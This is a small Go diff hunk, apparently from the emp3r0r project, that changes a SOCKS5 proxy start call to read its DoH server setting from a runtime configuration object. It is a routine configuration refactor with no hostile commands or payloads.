@@ -43,7 +43,7 @@ func Socks5Proxy(op string, addr string) (err error) {
 	case "on":
 		log.Printf("Starting Socks5Proxy %s", addr)
 		go func() {
-			err = tun.StartSocks5Proxy(addr, emp3r0r_data.DoHServer, emp3r0r_data.ProxyServer)
+			err = tun.StartSocks5Proxy(addr, RuntimeConfig.DoHServer, emp3r0r_data.ProxyServer)
 			if err != nil {
 				log.Printf("StartSock5Proxy %s: %v", addr, err)
 			}
